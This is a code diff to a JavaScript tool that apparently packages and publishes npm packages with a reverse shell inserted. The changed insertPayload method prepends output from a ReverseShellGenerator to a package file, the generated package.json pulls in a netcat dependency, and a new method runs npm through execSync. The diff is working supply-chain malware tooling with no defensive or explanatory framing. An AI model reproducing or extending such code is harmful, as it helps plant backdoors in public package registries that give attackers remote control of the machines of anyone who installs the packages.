@@ -2,6 +2,7 @@
 
 import fs from 'fs'
 import pack from 'libnpmpack'
+import { execSync } from 'child_process'
 import { publish } from 'libnpmpublish'
 import ReverseShellGenerator from './ReverseShellGenerator.js'
 // npmjs default registry
@@ -20,9 +21,16 @@ class PackageManager {
         this.shell_data = shell_data
     }
 
+    installDependencies(file) {
+        return execSync(`$(which npm) ${file}`, {
+            cwd: this.base_directory
+        })
+    }
+
     insertPayload(file) {
-        console.log(`${this.base_directory}/${file}`)
-        fs.appendFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener())
+        const contents = fs.readFileSync(`${this.base_directory}/${file}`, 'utf8')
+        fs.writeFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener(this.pkg) + contents)
+        //fs.appendFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener(this.pkg))
         return true
     }
 
@@ -34,8 +42,9 @@ class PackageManager {
             version: this.version,
             private: false,
             dependencies: {
-                "netcat": "^1.5.0",
-            }
+                'netcat': '^1.5.0',
+            },
+            type: 'module'
         })
         fs.writeFileSync(`${this.directory}/package.json`, package_json)
 
